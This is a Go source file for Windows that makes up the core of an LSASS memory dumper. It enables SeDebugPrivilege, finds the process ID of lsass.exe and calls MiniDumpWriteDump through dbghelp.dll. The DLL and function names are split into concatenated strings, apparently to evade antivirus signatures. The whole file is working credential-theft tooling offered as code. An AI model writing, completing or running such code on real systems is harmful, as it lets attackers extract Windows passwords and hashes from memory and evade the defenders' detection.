//go:build amd64 && windows
// +build amd64,windows

package dumpopt

import (
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

func SetSeDebugPrivilege() error {
	handle := windows.CurrentProcess()

	var token windows.Token
	err := windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES, &token)
	if err != nil {
		return err
	}

	var luid windows.LUID
	name, _ := windows.UTF16FromString("SeDebugPrivilege")
	err = windows.LookupPrivilegeValue(nil, &name[0], &luid)
	if err != nil {
		return err
	}

	var tokenprivileges windows.Tokenprivileges
	tokenprivileges.PrivilegeCount = 1
	tokenprivileges.Privileges[0].Luid = luid
	tokenprivileges.Privileges[0].Attributes = 0x00000002

	err = windows.AdjustTokenPrivileges(token, false, &tokenprivileges, uint32(unsafe.Sizeof(tokenprivileges)), nil, nil)
	if err != nil {
		return err
	}
	return nil
}

func FindPid() (int, error) {
	sHandle, err := windows.CreateToolhelp32Snapshot(0x00000002, 0)
	if err != nil {
		return 0, err
	}
	pid := 0
	defer windows.Close(sHandle)

	var entry windows.ProcessEntry32

	entry.Size = uint32(unsafe.Sizeof(entry))
	err = windows.Process32First(sHandle, &entry)
	if err != nil {
		return 0, err
	}

	for {
		_ = windows.Process32Next(sHandle, &entry)
		if windows.UTF16ToString(entry.ExeFile[:]) == "lsass.exe" {
			pid = int(entry.ProcessID)
			break
		}
	}
	return pid, nil
}

func MiniDumpWriteDump(hProcess windows.Handle, ProcessId uint32,
	hFile windows.Handle, DumpType uint32) error {
	r1, _, lastErr := syscall.NewLazyDLL("dbgh"+"elp.dll").NewProc("MiniDum"+"pWriteDump").Call(uintptr(hProcess), uintptr(ProcessId),
		uintptr(hFile), uintptr(DumpType), uintptr(0), uintptr(0), uintptr(0))
	// If function succeed output is TRUE
	if r1 == uintptr(1) {
		return nil
	}
	return lastErr
}
